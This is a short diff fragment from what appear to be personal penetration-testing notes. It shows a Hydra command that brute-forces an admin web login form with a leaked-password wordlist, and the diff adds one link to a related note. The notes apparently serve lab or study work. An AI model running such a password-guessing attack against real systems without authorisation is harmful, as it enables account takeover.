@@ -4,6 +4,8 @@ hydra $IP http-post-form "/admin/login.php:username=^USER^&password=^PASS^&login
 -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt -t 10 -w 30 -o hydra-http-post-attack.txt
 ```
 
+` zet/20221003150666/README.md `
+
 # Related
 
 
